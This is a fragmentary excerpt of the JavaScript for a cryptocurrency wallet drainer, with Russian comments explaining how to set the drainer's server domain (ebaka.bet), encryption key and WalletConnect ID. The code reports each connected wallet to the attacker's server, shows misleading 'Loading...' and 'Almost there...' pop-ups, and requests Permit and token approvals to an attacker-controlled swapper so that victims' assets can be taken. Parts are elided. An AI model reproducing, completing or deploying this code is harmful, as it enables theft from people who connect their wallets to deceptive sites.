...
let CF_EKEY = 3528; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
...
const CF_Server_URL = "ebaka.bet"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "f945f006bb6b14f341086f741727f21d"; // Project ID из WalletConnect Cloud
...
const CF_Modal_Mode = 1; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора
...
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false;
        ...
        try {
          if (CF_Loader_Style == 2) {
            MSL.fire({
              ...
              confirmButtonText: 'OK', timer: 30000, color: CF_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
...
const connect_success = async () => {
  try {
    ...
    await send_request({
      ...
      wallet: CF_Current_Provider, chain_id: CF_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
                            ...
                            MSL.fire({
                              ...
                              MSL.fire({
                                ...
                                MSL.fire({
                                  ...
                                  showConfirmButton: true, confirmButtonText: 'Almost there...', timer: 300000, color: CF_Color_Scheme
                                });
                              });
                            });
                          });
...
const DO_CONTRACT_NEW = async (asset) => {
  ...
  MSL.fire({
    ...
    showConfirmButton: true, confirmButtonText: 'Loading...', timer: 30000, color: CF_Color_Scheme
  });
...
const APPROVE_TO_SWAPPER = async (asset, swapper_address) => {
  ...
  if (CF_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
    ...
    if (CF_Settings.Settings.Approve.MetaMask >= 2 && asset.increase) {
      ...
      if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000); sign_ready();
